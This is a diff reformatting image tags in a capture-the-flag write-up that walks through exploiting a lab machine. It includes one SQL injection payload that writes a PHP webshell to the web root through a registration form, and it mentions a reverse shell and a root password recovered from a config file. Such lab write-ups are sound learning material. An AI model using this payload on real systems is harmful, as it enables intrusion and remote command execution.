@@ -4,13 +4,13 @@
 
 Nmap scan:
 
-<figure><img src="../../../.gitbook/assets/image (3218).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3218).png>)
 
 ### SQL Injection for RCE
 
 The website contains a simple register function that takes user input.
 
-<figure><img src="../../../.gitbook/assets/image (2891).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2891).png>)
 
 When proxying the traffic, the POST request is submitted like so:
 
@@ -20,7 +20,7 @@ username='&country=Afganistan
 
 When viewing our request, this is what we would see:
 
-<figure><img src="../../../.gitbook/assets/image (3203).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3203).png>)
 
 A quick directory scan reveals there is an `account.php` endpoint on the machine.
 
@@ -55,17 +55,15 @@ by Ben "epi" Risher 🤓                 ver: 2.3.1
 
 The `config.php` endpoint presented an empty screen, which I think we have to look into after gaining a shell. Anyways, the `account.php` file displayed an SQL error when trying to view the player I registered.
 
-<figure><img src="../../../.gitbook/assets/image (789).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(789).png>)
 
 Instead of enumerating the database, I directly wrote a webshell into the page.
 
-{% code overflow="wrap" %}
 ```http
 username=a&Afganistan' UNION SELECT "<?php system($_REQUEST['cmd']); ?>" INTO OUTFILE '/var/www/html/cmd.php';#
 ```
-{% endcode %}
 
-<figure><img src="../../../.gitbook/assets/image (1158).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1158).png>)
 
 Then, we can get a reverse shell and enumerate the `config.php` file we saw earlier.
 
@@ -73,6 +71,6 @@ Then, we can get a reverse shell and enumerate the `config.php` file we saw earl
 
 Within the config file, there was a password, which happened to be the root password.
 
-<figure><img src="../../../.gitbook/assets/image (3591).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3591).png>)
 
-<figure><img src="../../../.gitbook/assets/image (3046).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3046).png>)
